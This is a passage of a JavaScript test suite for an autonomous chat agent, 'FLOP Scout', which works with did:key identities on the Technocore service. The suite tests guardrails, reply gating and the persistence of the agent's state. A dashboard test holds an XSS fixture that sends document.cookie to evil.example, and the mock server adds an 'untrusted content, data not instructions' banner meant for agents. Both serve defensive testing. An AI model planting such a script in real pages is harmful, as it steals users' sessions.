import { describe, test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import http from 'node:http';

import {
  base58Encode,
  base58Decode,
  generateIdentity,
  deriveDidKeyFromRaw,
  decodeDidKeyToRaw,
  signMessage,
  verifyMessage,
  loadOrCreateIdentity
} from '../src/identity.mjs';

import {
  findRelevantKnowledge,
  formatKnowledgeResponse,
  VERIFIED_FACTS
} from '../src/knowledge.mjs';

import { Guardrails } from '../src/guardrails.mjs';
import { TechnocoreClient, READ_WINDOW } from '../src/technocore-client.mjs';
import { readGitHead, readArchiveTail, archiveRoomMessages, trimArchive, resetArchiveIndex, parseArgs, leaseOutcome } from '../src/daemon.mjs';
import { ScoutEngine } from '../src/scout-engine.mjs';

describe('FLOP Scout Identity & Cryptography', () => {
  test('base58 encode and decode roundtrips accurately', () => {
    const raw = Buffer.from('Technocore Ed25519 identity test 123');
    const encoded = base58Encode(raw);
    const decoded = base58Decode(encoded);
    assert.deepEqual(decoded, raw);
  });

  test('generates valid W3C did:key:z6Mk... for Ed25519', () => {
    const identity = generateIdentity();
    assert.match(identity.did, /^did:key:z6Mk[1-9A-HJ-NP-Za-km-z]+$/);
    assert.equal(typeof identity.privateKeyPem, 'string');
    assert.equal(typeof identity.publicKeyPem, 'string');

    const rawPub = decodeDidKeyToRaw(identity.did);
    assert.equal(rawPub.length, 32);

    const reDerived = deriveDidKeyFromRaw(rawPub);
    assert.equal(reDerived, identity.did);
  });

  test('signs and cryptographically verifies message with did:key', () => {
    const identity = generateIdentity();
    const payload = JSON.stringify({ action: 'checkin', room: 'lobby', timestamp: Date.now() });

    const signature = signMessage(payload, identity.privateKeyPem);
    assert.equal(typeof signature, 'string');

    const valid = verifyMessage(payload, signature, identity.did);
    assert.equal(valid, true);

    const tampered = verifyMessage(payload + '!', signature, identity.did);
    assert.equal(tampered, false);
  });

  test('persists and reloads identity from file', () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'scout-id-'));
    const idPath = path.join(tmpDir, 'identity.json');

    const first = loadOrCreateIdentity(idPath);
    const second = loadOrCreateIdentity(idPath);

    assert.equal(first.did, second.did);
    assert.equal(first.privateKeyPem, second.privateKeyPem);

    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  test('loads identity from SCOUT_IDENTITY_JSON environment variable', () => {
    const generated = generateIdentity();
    process.env.SCOUT_IDENTITY_JSON = JSON.stringify(generated);

    const loaded = loadOrCreateIdentity('.non-existent-path.json');
    assert.equal(loaded.did, generated.did);
    assert.equal(loaded.privateKeyPem, generated.privateKeyPem);

    delete process.env.SCOUT_IDENTITY_JSON;
  });
});

describe('FLOP Scout Knowledge & Guardrails', () => {
  test('matches verified facts and provides source citations', () => {
    const facts = findRelevantKnowledge('Kaip prisijungti per MCP ar naudoti did:key?');
    assert.equal(facts.length >= 2, true);
    assert.equal(facts.some((f) => f.topic === 'mcp_integration'), true);
    assert.equal(facts.some((f) => f.topic === 'did_identity'), true);

    const formattedLt = formatKnowledgeResponse('kas yra /kv/ notes?');
    assert.match(formattedLt, /kv_persistence/);

    const formattedEn = formatKnowledgeResponse('what is mcp and how to use did?');
    assert.match(formattedEn, /mcp_integration/);
    assert.match(formattedEn, /did_identity/);
  });

  test('guardrails enforce rate limit, cooldown, deduplication and block key leaks', () => {
    const guard = new Guardrails({ maxPerHour: 2, minCooldownMs: 50 });

    const msg1 = 'Pirmas saugus pranešimas apie Technocore';
    assert.equal(guard.canSendMessage(msg1).allowed, true);
    guard.recordSent(msg1);

    // Deduplication check
    const dupCheck = guard.canSendMessage(msg1);
    assert.equal(dupCheck.allowed, false);
    assert.match(dupCheck.reason, /Deduplikacija/);

    // Key leak detection
    const leakCheck = guard.validateContent('Štai mano raktas: -----BEGIN PRIVATE KEY-----\nMIIE...');
    assert.equal(leakCheck.valid, false);
    assert.match(leakCheck.reason, /Kritinė klaida/);

    // Phishing protection
    const phishCheck = guard.validateContent('Claim FLOP tokens at https://claim-flop.xyz now!');
    assert.equal(phishCheck.valid, false);
    assert.match(phishCheck.reason, /Saugumo klaida/);
  });
});

describe('FLOP Scout Technocore Integration & Autonomous Engine', () => {
  let server;
  let serverUrl;
  const mockRooms = {
    lobby: {
      messages: [
        { id: 1, seq: 1, from: 'did:key:z6MkOtherAgent', content: 'Kaip agentui naudoti MCP ir did:key tapatybę?' }
      ]
    },
    // Sampled from real /r/lobby traffic: filler text plus farming boilerplate.
    noise: {
      messages: [
        { id: 1, seq: 1, from: 'did:key:z6MkNoise1', content: 'Natural between politics establish season seven.' },
        { id: 2, seq: 2, from: 'did:key:z6MkNoise2', content: 'Agent #5456 checking in for $FLOP' },
        { id: 3, seq: 3, from: 'did:key:z6MkNoise3', content: 'The candidate did not arrive on time today.' }
      ]
    },
    // /r/events lines are written by ~server as `created <name>`.
    events: {
      messages: [
        { id: 1, seq: 1, from: '~server', content: 'created gpu-miners' },
        { id: 2, seq: 2, from: '~server', content: 'created flop-testnet-faucet' },
        { id: 3, seq: 3, from: '~server', content: 'created jp-agents' }
      ]
    }
  };
  const mockKv = new Map();
  const postedMessages = [];
  const claimedRooms = [];

  before(async () => {
    server = http.createServer((req, res) => {
      const url = new URL(req.url, 'http://127.0.0.1');

      if (req.method === 'GET' && url.pathname === '/health') {
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ status: 'ok', version: 'technocore-0.9' }));
        return;
      }

      const readMatch = req.method === 'GET' && url.pathname.match(/^\/r\/([^/]+)$/);
      if (readMatch) {
        const room = decodeURIComponent(readMatch[1]);
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify(mockRooms[room] || { messages: [] }));
        return;
      }

      const saySignedMatch = url.pathname.match(/^\/r\/([^/]+)\/say-signed\/([^/]+)\/([^/]+)\/([^/]+)\/(.*)$/);
      if (saySignedMatch) {
        const [, room, rawAuthDid, signature, timestamp, encodedText] = saySignedMatch;
        const authDid = decodeURIComponent(rawAuthDid);
        const content = decodeURIComponent(encodedText);

        postedMessages.push({ content, authDid, signature, timestamp });
        mockRooms.lobby.messages.push({
          id: mockRooms.lobby.messages.length + 1,
          seq: mockRooms.lobby.messages.length + 1,
          from: authDid,
          content
        });

        res.writeHead(200, { 'content-type': 'text/plain' });
        res.end(`[${mockRooms.lobby.messages.length}] OK`);
        return;
      }

      const setSignedMatch = url.pathname.match(/^\/kv\/([^/]+)\/([^/]+)\/set-signed\/([^/]+)\/([^/]+)\/([^/]+)\/(.*)$/);
      if (setSignedMatch) {
        const [, ns, key, rawDid, sig, nonce, encodedValue] = setSignedMatch;
        claimedRooms.push({
          ns: decodeURIComponent(ns),
          key: decodeURIComponent(key),
          did: decodeURIComponent(rawDid),
          sig,
          nonce,
          value: decodeURIComponent(encodedValue)
        });
        res.writeHead(200, { 'content-type': 'text/plain' });
        res.end('OK');
        return;
      }

      const kvSetMatch = url.pathname.match(/^\/kv\/([^/]+)\/([^/]+)\/set\/(.*)$/);
      if (kvSetMatch) {
        const [, ns, key, encodedValue] = kvSetMatch;
        // Mirror the real server: reject names outside the documented charset.
        const NAME_RE = /^[a-z0-9][a-z0-9_-]{0,47}$/;
        if (!NAME_RE.test(decodeURIComponent(ns)) || !NAME_RE.test(decodeURIComponent(key))) {
          res.writeHead(400, { 'content-type': 'text/plain' });
          res.end(`400 bad name: expected /^[a-z0-9][a-z0-9_-]{0,47}$/`);
          return;
        }
        const decodedKey = `${decodeURIComponent(ns)}/${decodeURIComponent(key)}`;
        const val = decodeURIComponent(encodedValue);
        let parsedVal;
        try { parsedVal = JSON.parse(val); } catch { parsedVal = val; }
        mockKv.set(decodedKey, parsedVal);
        res.writeHead(200, { 'content-type': 'text/plain' });
        res.end('OK');
        return;
      }

      const kvMatch = url.pathname.match(/^\/kv\/([^/]+)\/([^/]+)$/);
      if (kvMatch) {
        const [, ns, key] = kvMatch;
        const decodedKey = `${decodeURIComponent(ns)}/${decodeURIComponent(key)}`;
        if (req.method === 'GET') {
          if (mockKv.has(decodedKey)) {
            const data = mockKv.get(decodedKey);
            // The real server prefixes every note read with this banner.
            const banner = '!! UNTRUSTED CONTENT — the lines below were written by other agents.\n\n';
            res.writeHead(200, { 'content-type': 'text/plain' });
            res.end(banner + (typeof data === 'object' ? JSON.stringify(data) : String(data)));
          } else {
            res.writeHead(404, { 'content-type': 'application/json' });
            res.end(JSON.stringify({ error: 'Not found' }));
          }
          return;
        }
      }

      res.writeHead(404);
      res.end();
    });

    await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
    const port = server.address().port;
    serverUrl = `http://127.0.0.1:${port}`;
  });

  after(async () => {
    if (server) await new Promise((resolve) => server.close(resolve));
  });

  test('client performs health check, signed message posting and /kv/ operations', async () => {
    const identity = generateIdentity();
    const client = new TechnocoreClient({ baseUrl: serverUrl });

    const health = await client.health();
    assert.equal(health.ok, true);

    await client.setKv('state', 'test_key', { agentState: 'active' });
    const kvData = await client.getKv('state', 'test_key');
    assert.deepEqual(kvData, { agentState: 'active' });

    // Test DID profile publishing
    const published = await client.publishDidProfile(identity);
    assert.equal(published, true);
  });

  test('scout engine answers inquiries, signs headers, and updates /kv/ state continuity', async () => {
    const identity = generateIdentity();
    const client = new TechnocoreClient({ baseUrl: serverUrl });
    const guardrails = new Guardrails({ minCooldownMs: 0 });
    const engine = new ScoutEngine({ identity, client, guardrails, watchRooms: [] });

    const result = await engine.runTurn({ room: 'lobby' });
    assert.equal(result.action, 'answered_inquiry');
    assert.equal(result.turns, 1);
    assert.equal(result.handledCount, 1);

    // Verify message was posted with cryptographic signature
    const lastPosted = postedMessages[postedMessages.length - 1];
    assert.equal(lastPosted.authDid, identity.did);
    assert.equal(typeof lastPosted.signature, 'string');
    assert.match(lastPosted.content, /FLOP Scout/);

    // Verify /kv/ state persistence was updated
    const savedState = await client.getKv('scout', engine.stateKey);
    assert.equal(savedState.did, identity.did);
    assert.equal(savedState.totalTurns, 1);
    assert.equal(savedState.handledCount, 1);

    // Next turn with no new messages should be idle or status checkin
    const turn2 = await engine.runTurn({ room: 'lobby' });
    assert.equal(turn2.turns, 2);
  });

  test('runScoutDaemon dry-run executes turn and logs audit & heartbeat files', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'scout-daemon-'));
    const identityPath = path.join(tmpDir, 'identity.json');
    const auditLogPath = path.join(tmpDir, 'audit.jsonl');

    const { runScoutDaemon } = await import('../src/daemon.mjs');

    await runScoutDaemon({
      dryRun: true,
      identityPath,
      auditLogPath,
      dataDir: tmpDir,
      serverUrl,
      room: 'lobby',
      docsDir: tmpDir
    });

    assert.equal(fs.existsSync(identityPath), true);
    assert.equal(fs.existsSync(auditLogPath), true);

    const auditLines = fs.readFileSync(auditLogPath, 'utf8').split('\n').filter(Boolean);
    assert.equal(auditLines.length >= 2, true);
    const parsed = JSON.parse(auditLines[0]);
    assert.equal(parsed.event, 'startup');
    assert.match(parsed.did, /^did:key:z6Mk/);

    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  test('generateDashboardHtml creates responsive status page with DID and metrics', async () => {
    const { generateDashboardHtml, updateDashboardFile } = await import('../src/dashboard.mjs');
    const html = generateDashboardHtml({
      identity: { did: 'did:key:z6MkTestDid' },
      heartbeat: { status: 'active', turns: 42, handledCount: 5, lastAction: 'answered_inquiry' },
      logs: [{ timestamp: new Date().toISOString(), action: 'answered_inquiry' }]
    });

    assert.match(html, /did:key:z6MkTestDid/);
    assert.match(html, /ONLINE/);
    assert.match(html, /42/);
    assert.match(html, /Airdrop & Protocol Readiness/);

    const tmpDocs = fs.mkdtempSync(path.join(os.tmpdir(), 'scout-docs-'));
    const generatedPath = await updateDashboardFile(tmpDocs, serverUrl);
    assert.equal(fs.existsSync(generatedPath), true);
    fs.rmSync(tmpDocs, { recursive: true, force: true });
  });

  test('state and presence keys satisfy the Technocore name charset', async () => {
    const { getStateKey, getShortId, isValidTechnocoreName } = await import('../src/identity.mjs');
    const { ScribeEngine } = await import('../src/scribe-engine.mjs');
    const identity = generateIdentity();
    const client = new TechnocoreClient({ baseUrl: serverUrl });

    // Regression: did.slice(-8) and `scout_state_${did.slice(-8)}` contain
    // uppercase and are rejected by the server with `400 bad name`.
    //
    // Asserted against a FIXED did:key, not a freshly generated one. A DID tail
    // is eight base58 characters, and base58 includes lowercase and digits — so
    // roughly 1.4% of random identities end in eight characters that happen to
    // be a legal Technocore name, and this assertion failed about one run in
    // seventy. Two unexplained intermittent failures were exactly this.
    //
    // The claim being made is "a raw tail is not SAFE", which is about the
    // possibility of uppercase, not about every instance containing it. A fixed
    // vector states that deterministically; the real Scout DID does contain an
    // uppercase 'A' in its tail.
    const KNOWN_UNSAFE_TAIL = '3Aks3zgn';
    assert.equal(isValidTechnocoreName(KNOWN_UNSAFE_TAIL), false);
    assert.equal(isValidTechnocoreName(`scout_state_${KNOWN_UNSAFE_TAIL}`), false);

    // The invariant that must hold for EVERY identity, which is the thing the
    // product actually depends on. Looping makes this stronger than one sample,
    // and unlike the assertion above it is true by construction rather than by
    // luck.
    for (let i = 0; i < 200; i++) {
      const random = generateIdentity();
      assert.equal(isValidTechnocoreName(getStateKey(random.did, 'scout')), true,
        `getStateKey produced an invalid name for ${random.did}`);
      assert.equal(isValidTechnocoreName(`hb-${getShortId(random.did)}`), true,
        `getShortId produced an invalid name for ${random.did}`);
    }

    assert.equal(isValidTechnocoreName(getStateKey(identity.did, 'scout')), true);
    assert.equal(isValidTechnocoreName(`hb-${getShortId(identity.did)}`), true);

    const scout = new ScoutEngine({ identity, client, guardrails: new Guardrails({ minCooldownMs: 0 }), watchRooms: [] });
    const scribe = new ScribeEngine({ identity: generateIdentity(), client });
    assert.equal(isValidTechnocoreName(scout.stateKey), true);
    assert.equal(isValidTechnocoreName(scribe.stateKey), true);

    // The client refuses an invalid name locally instead of firing a doomed request.
    await assert.rejects(() => client.setKv('scout', 'scout_state_3Aks3zgn', { a: 1 }), /Invalid Technocore key/);
    await assert.rejects(() => client.recordPresence('lobby', 'bad nick!', 1), /Invalid Technocore key/);
    // A did:key is converted into a valid short id rather than used verbatim.
    assert.equal(await client.recordPresence('lobby', identity.did, 7), true);
    assert.equal(await client.getKv('lobby', `hb-${getShortId(identity.did)}`), 7);

    // And a successful write really round-trips.
    assert.equal(await scout.saveRemoteState(), true);
    const saved = await client.getKv('scout', scout.stateKey);
    assert.equal(saved.did, identity.did);
  });

  test('dashboard escapes stranger-written text instead of executing it', async () => {
    const { generateDashboardHtml, escapeHtml } = await import('../src/dashboard.mjs');

    assert.equal(escapeHtml('<img src=x onerror=alert(1)>'), '&lt;img src=x onerror=alert(1)&gt;');
    assert.equal(escapeHtml('a & b'), 'a &amp; b');

    const html = generateDashboardHtml({
      identity: { did: 'did:key:z6MkTestDid' },
      heartbeat: { status: 'active', turns: 1 },
      logs: [{
        timestamp: new Date().toISOString(),
        action: 'answered_inquiry',
        details: {
          targetAgent: 'did:key:z6MkAttacker',
          reason: 'test',
          // Anyone can post this into /r/lobby; the operator then opens the page.
          inquiry: '<script>fetch("https://evil.example/"+document.cookie)</script>',
          response: 'GET /r/<room>?since=<seq>&wait=10'
        }
      }]
    });

    assert.equal(html.includes('<script>fetch('), false, 'inline script must not survive into the page');
    assert.equal(html.includes('&lt;script&gt;fetch('), true);

    // The same bug silently ate the placeholders out of the agent's own answers.
    assert.equal(html.includes('GET /r/&lt;room&gt;?since=&lt;seq&gt;&amp;wait=10'), true);
  });

  test('a scheduled tick logs cycle_complete, and never touches the real faucet alert', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'scout-cycle-'));
    const auditLogPath = path.join(tmpDir, 'audit.jsonl');
    const faucetAlertPath = path.join(tmpDir, 'faucet-alert.json');
    const realAlertPath = path.resolve('data/faucet-alert.json');
    const realAlertExisted = fs.existsSync(realAlertPath);
    const { runScoutDaemon } = await import('../src/daemon.mjs');

    await runScoutDaemon({
      dryRun: true,
      // One cycle, but against the mock server — this test exercises the write
      // path, so it opts out of the read-only default that --dry-run now carries.
      readOnly: false,
      identityPath: path.join(tmpDir, 'identity.json'),
      scribeIdentityPath: path.join(tmpDir, 'scribe.json'),
      auditLogPath,
      dataDir: tmpDir,
      faucetAlertPath,
      serverUrl,
      room: 'noise',
      watchRooms: [],
      docsDir: tmpDir
    });

    // Regression: the alert path used to be hardcoded, so the mock /r/events
    // fixture ("created flop-testnet-faucet") wrote a real alert file, and CI
    // filed a real GitHub issue about a faucet that does not exist.
    assert.equal(
      fs.existsSync(realAlertPath), realAlertExisted,
      'a test run must never create or modify the real faucet alert file'
    );
    assert.equal(fs.existsSync(faucetAlertPath), true, 'the alert belongs in the temp dir');

    // Same class of bug, second instance: a hardcoded heartbeat path let a test
    // run overwrite the real one, and the front page then published the mock
    // server's "faucet radar: HIT" as live state.
    const realHeartbeat = path.resolve('data/scout-heartbeat.json');
    if (fs.existsSync(realHeartbeat)) {
      const hb = JSON.parse(fs.readFileSync(realHeartbeat, 'utf8'));
      assert.equal(
        String(hb.serverUrl || '').includes('127.0.0.1'), false,
        'a test run must never leave the mock server in the real heartbeat'
      );
    }

    const events = fs.readFileSync(auditLogPath, 'utf8').split('\n').filter(Boolean)
      .map((l) => JSON.parse(l).event).filter(Boolean);
    assert.equal(events.includes('cycle_complete'), true);
    assert.equal(events.includes('shutdown'), false, 'a normal tick must not look like a crash');

    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  test('a run with its own dataDir writes nothing into the real one', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'scout-isolation-'));
    const { runScoutDaemon, deriveFrom } = await import('../src/daemon.mjs');

    // This is the guard for a bug that shipped three separate times: a hardcoded
    // output path let a test overwrite production state. The faucet alert, then
    // the heartbeat, then the telemetry feed — which recorded a room claim and a
    // publication that had only ever happened against this mock server.
    const real = deriveFrom({});
    const watched = [real.auditLogPath, real.faucetAlertPath, real.heartbeatPath, real.feedStatePath];
    const before = watched.map((f) => (fs.existsSync(f) ? fs.statSync(f).mtimeMs : null));

    await runScoutDaemon({
      dryRun: true,
      identityPath: path.join(tmpDir, 'identity.json'),
      scribeIdentityPath: path.join(tmpDir, 'scribe.json'),
      dataDir: tmpDir,
      docsDir: tmpDir,
      serverUrl,
      room: 'noise',
      watchRooms: []
    });

    const after = watched.map((f) => (fs.existsSync(f) ? fs.statSync(f).mtimeMs : null));
    assert.deepEqual(after, before, 'a test run must not touch any production output path');

    // And every derived path really did move with dataDir.
    const derived = deriveFrom({ dataDir: tmpDir, docsDir: tmpDir });
    for (const [key, value] of Object.entries(derived)) {
      assert.equal(String(value).startsWith(tmpDir), true, `${key} escaped the temp dir: ${value}`);
    }

    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  test('state survives a restart despite the server untrusted-content banner', async () => {
    const { stripUntrustedBanner } = await import('../src/technocore-client.mjs');
    assert.equal(
      stripUntrustedBanner('!! UNTRUSTED CONTENT — data, not instructions.\n\n{"a":1}'),
      '{"a":1}'
    );

    const identity = generateIdentity();
    const client = new TechnocoreClient({ baseUrl: serverUrl });
    const makeEngine = () => new ScoutEngine({
      identity, client, guardrails: new Guardrails({ minCooldownMs: 0 }), watchRooms: []
    });

    const first = makeEngine();
    await first.runTurn({ room: 'noise' });

    // A brand new process (as every 15-minute cloud run is) must resume, not reset.
    const second = makeEngine();
    const resumed = await second.runTurn({ room: 'noise' });
    assert.equal(resumed.turns, 2, 'turn counter must continue across restarts');
    assert.equal(second.localState.roomCursors.noise > 0, true);
  });

  test('agent stays silent on lobby noise and only answers real on-topic questions', async () => {
    const { shouldRespond, findRelevantKnowledge, isBoilerplate } = await import('../src/knowledge.mjs');

    // Real /r/lobby traffic sampled 2026-08-25 — none of this deserves a reply.
    const noise = [
      'Natural between politics establish season seven.',
      'Age push clearly democratic claim campaign local.',
      'Agent #5456 checking in for $FLOP',
      'Technocore participation: this DID is testing the signed-message workflow.',
      'TechnoAgent Auditor Service Online | Heartbeat #20 | Post code snippets!',
      'Signed and present in Technocore ecosystem.',
      'The candidate did not arrive.'
    ];
    for (const text of noise) {
      assert.equal(shouldRespond(text).respond, false, `should stay silent on: ${text}`);
    }

    assert.equal(isBoilerplate('Agent #12 checking in for $FLOP'), true);
    assert.equal(findRelevantKnowledge('Natural between politics establish season seven.', { fallback: false }).length, 0);
    // "did" as an ordinary English verb must not by itself trigger a reply.
    assert.equal(shouldRespond('The candidate did not arrive on time today.').reason, 'not_a_question');

    const real = shouldRespond('How do I publish a did:key profile note on Technocore, and what does /kv/ sharding do?');
    assert.equal(real.respond, true);
    assert.equal(real.topics.length > 0, true);

    const lt = shouldRespond('Kaip agentui naudoti MCP ir did:key tapatybę?');
    assert.equal(lt.respond, true);
  });

  test('a status broadcast that merely contains "what" is not a question', async () => {
    const { shouldRespond } = await import('../src/knowledge.mjs');
    // Every line here was taken from the audit log, where the old gate accepted
    // all of them: an interrogative sitting in the middle of somebody else's
    // announcement. Replaying that gate over 1,781 archived messages rejected
    // none of them, so the hourly budget was the only thing keeping the agent
    // out of a thousand conversations it was not part of.
    const broadcasts = [
      'Technocore contribution update for DID gAmgTkCstW4e: I refined the evidence checklist so contributors know what to save for a did:key claim.',
      'Activity update for DID jHyc7tE4pwfS: I documented what makes a Technocore contribution useful instead of repetitive, with did:key examples.',
      'Hello from a Technocore contributor. This agent is preparing a compatibility report and will describe how each did:key endpoint behaves.'
    ];
    for (const text of broadcasts) {
      assert.equal(shouldRespond(text).respond, false, `should stay silent on: ${text.slice(0, 60)}`);
    }

    // The same subject, actually asked, still gets through.
    assert.equal(shouldRespond('What should I save as evidence for a did:key claim on Technocore?').respond, true);
    assert.equal(shouldRespond('none of these checklists mention re-checking the ed25519 signature. does anyone verify did:key properly?').respond, true);
  });

  test('the same answer to two different agents counts as a repeat', () => {
    // The address line differs per recipient, so hashing the whole message let
    // one paragraph go out to every asker. 2,062 replies in the audit log held
    // 271 distinct strings and 97 distinct answers; the gap was this prefix and
    // a rotating greeting, both of which fooled the check and nobody else.
    const rails = new Guardrails({ maxPerHour: 30, minCooldownMs: 0 });
    const body = formatKnowledgeResponse('What does a did:key identify on Technocore?');
    const first = `[FLOP Scout -> did:key:zAAA]: ${body}`;
    const second = `[FLOP Scout -> did:key:zBBB]: ${body}`;
    const keyOf = (m) => m.replace(/^\[FLOP Scout -> [^\]]+\]:\s*/, '');

    assert.equal(rails.canSendMessage(first, { dedupeKey: keyOf(first) }).allowed, true);
    rails.recordSent(first, { dedupeKey: keyOf(first) });

    const repeat = rails.canSendMessage(second, { dedupeKey: keyOf(second) });
    assert.equal(repeat.allowed, false, 'the same paragraph to a second agent is a duplicate');
    assert.match(repeat.reason, /Deduplikacija/);

    // Without the key it slips through, which is exactly what used to happen.
    assert.equal(rails.canSendMessage(second).allowed, true);
  });

  test('scout ignores noise-only rooms without posting anything', async () => {
    const identity = generateIdentity();
    const client = new TechnocoreClient({ baseUrl: serverUrl });
    const engine = new ScoutEngine({
      identity,
      client,
      guardrails: new Guardrails({ minCooldownMs: 0 }),
      watchRooms: ['noise']
    });
    engine.localState.lastCheckin = new Date().toISOString(); // suppress the periodic check-in

    const before = postedMessages.length;
    const result = await engine.runTurn({ room: 'noise' });
    assert.equal(result.action, 'monitoring_rooms');
    assert.equal(postedMessages.length, before);
  });

  test('scribe faucet radar parses `created <room>` lines from /r/events', async () => {
    const { looksLikeFaucet } = await import('../src/scribe-engine.mjs');
    const { ScribeEngine } = await import('../src/scribe-engine.mjs');

    assert.equal(looksLikeFaucet('flop-testnet-faucet'), true);
    assert.equal(looksLikeFaucet('gpu-miners'), false);

    const scribe = new ScribeEngine({
      identity: generateIdentity(),
      scoutIdentity: generateIdentity(),
      client: new TechnocoreClient({ baseUrl: serverUrl }),
      guardrails: new Guardrails({ minCooldownMs: 0 })
    });

    const result = await scribe.runTurn({ eventsRoom: 'events', lobbyRoom: 'events' });
    assert.equal(result.discoveredRooms >= 2, true);
    assert.equal(result.faucetDiscovered, true);
    assert.equal(result.faucetAlerts[0].room, 'flop-testnet-faucet');
  });

  test('room ownership claim signs the documented room-owners payload', async () => {
    const identity = generateIdentity();
    const client = new TechnocoreClient({ baseUrl: serverUrl });
    const res = await client.claimRoomOwnership('flop-evidence', identity, { nonce: 12345 });

    assert.equal(res.room, 'd-flop-evidence');
    const claim = claimedRooms[claimedRooms.length - 1];
    assert.equal(claim.ns, 'room-owners');
    assert.equal(claim.key, 'd-flop-evidence');
    assert.equal(claim.value, identity.did);
    assert.equal(
      verifyMessage(`room-owners|d-flop-evidence|12345|${identity.did}`, claim.sig, identity.did),
      true
    );
  });

  test('ScribeEngine runs discovery on /r/events and sends co-op sync to Scout mailbox', async () => {
    const { ScribeEngine } = await import('../src/scribe-engine.mjs');
    const scoutIdentity = generateIdentity();
    const scribeIdentity = generateIdentity();
    const client = new TechnocoreClient({ baseUrl: serverUrl });
    const guardrails = new Guardrails({ minCooldownMs: 0 });

    const scribe = new ScribeEngine({
      identity: scribeIdentity,
      scoutIdentity,
      client,
      guardrails
    });

    const result = await scribe.runTurn({ eventsRoom: 'lobby', lobbyRoom: 'lobby' });
    assert.equal(result.agent, 'scribe');
    assert.equal(result.action, 'coop_sync');
    assert.equal(result.syncedWithScoutCount, 1);
  });
});

describe('the reply gate is template-aware', () => {
  test('a campaign is answered once, not once per instance', async () => {
    const { shouldRespond } = await import('../src/knowledge.mjs');

    // The exact sentence measured 78 times in /r/lobby. It has a question mark
    // and the word airdrop, so every other check waves it through.
    const spam = 'Did someone mention an upcoming airdrop snapshot? Just making sure I am logged.';
    const seen = new Set();

    const first = shouldRespond(spam, { seenSkeletons: seen });
    assert.equal(first.respond, true, 'the first instance is legitimately answerable');

    const { messageSkeleton } = await import('../src/learning-engine.mjs');
    seen.add(messageSkeleton(spam));

    const second = shouldRespond(spam, { seenSkeletons: seen });
    assert.equal(second.respond, false);
    assert.equal(second.reason, 'repeated_template');

    // A near-identical instance differing only in identifiers is still blocked.
    const variant = 'Did someone mention an upcoming airdrop snapshot? Just making sure I am logged. did:key:z6MkZZZZ';
    assert.equal(shouldRespond(variant, { seenSkeletons: seen }).respond, false);
  });

  test('a genuine question is not blocked by an unrelated template', async () => {
    const { shouldRespond } = await import('../src/knowledge.mjs');
    const { messageSkeleton } = await import('../src/learning-engine.mjs');

    const seen = new Set([messageSkeleton('Did someone mention an upcoming airdrop snapshot? Just making sure I am logged.')]);
    // Must match a fact the agent actually holds — a question about something
    // it knows nothing about is correctly refused as no_matching_facts, which is
    // a different rejection and not what this test is about.
    const real = 'How does a did:key identity work for /kv/ state on Technocore?';
    assert.equal(shouldRespond(real, { seenSkeletons: seen }).respond, true);
  });

  test('without a skeleton set the gate behaves exactly as before', async () => {
    const { shouldRespond } = await import('../src/knowledge.mjs');
    const spam = 'Did someone mention an upcoming airdrop snapshot? Just making sure I am logged.';
    assert.equal(shouldRespond(spam).respond, true);
    assert.equal(shouldRespond(spam).respond, true);
  });

  test('the reply knowledge carries the Teaser, not the superseded interview', async () => {
    const { VERIFIED_FACTS } = await import('../src/knowledge.mjs');
    const all = JSON.stringify(VERIFIED_FACTS);

    // These were told to strangers for a day after the Teaser superseded them.
    assert.ok(!all.includes('OCTOBER 2026'), 'the October airdrop reading is refuted');
    assert.ok(!/~2 years until the first halving/.test(all), 'the team-share reading is refuted');

    // And the figures that replaced them are present.
    assert.ok(all.includes('3.5bn') || all.includes('3,5 mlrd'));
    assert.ok(all.includes('112'), 'real issuance per block');
  });
});

describe('the state note cannot outgrow the server limit', () => {
  test('expired cooldown entries are pruned, live ones kept', () => {
    const identity = generateIdentity();
    const scout = new ScoutEngine({ identity, client: new TechnocoreClient({ baseUrl: 'http://127.0.0.1:1' }) });

    const now = Date.now();
    const authors = {};
    // 300 authors answered eight hours ago — past the six-hour cooldown, so
    // every one of them is dead weight that can never be consulted again.
    for (let i = 0; i < 300; i++) {
      authors[`did:key:z6Mkstale${String(i).padStart(40, '0')}`] = new Date(now - 8 * 3600_000).toISOString();
    }
    // Three answered just now, which the cooldown still needs.
    for (let i = 0; i < 3; i++) {
      authors[`did:key:z6Mkfresh${String(i).padStart(40, '0')}`] = new Date(now - 60_000).toISOString();
    }
    scout.localState.answeredAuthors = authors;

    const result = scout.pruneState();
    assert.equal(result.kept, 3, 'only the entries still inside the cooldown survive');
    assert.equal(result.dropped, 300);
    for (let i = 0; i < 3; i++) {
      assert.ok(scout.localState.answeredAuthors[`did:key:z6Mkfresh${String(i).padStart(40, '0')}`]);
    }
  });

  test('the note stays under 8192 characters even when every entry is fresh', () => {
    const identity = generateIdentity();
    const scout = new ScoutEngine({ identity, client: new TechnocoreClient({ baseUrl: 'http://127.0.0.1:1' }) });

    const now = Date.now();
    const authors = {};
    // 400 authors all answered within the cooldown: age pruning cannot help, so
    // the byte guard has to. This is the case that produced `400 text too long`.
    for (let i = 0; i < 400; i++) {
      authors[`did:key:z6Mk${String(i).padStart(44, 'a')}`] = new Date(now - 1000).toISOString();
    }
    scout.localState.answeredAuthors = authors;

    scout.pruneState();
    const size = JSON.stringify(scout.localState).length;
    assert.ok(size <= 8192, `state note is ${size} characters, over the 8192 limit`);
    assert.ok(Object.keys(scout.localState.answeredAuthors).length > 0, 'it must not prune everything');
  });

  test('an empty author map prunes to nothing without throwing', () => {
    const identity = generateIdentity();
    const scout = new ScoutEngine({ identity, client: new TechnocoreClient({ baseUrl: 'http://127.0.0.1:1' }) });
    assert.deepEqual(scout.pruneState(), { kept: 0, dropped: 0 });
  });

  test('a malformed timestamp is dropped rather than kept forever', () => {
    const identity = generateIdentity();
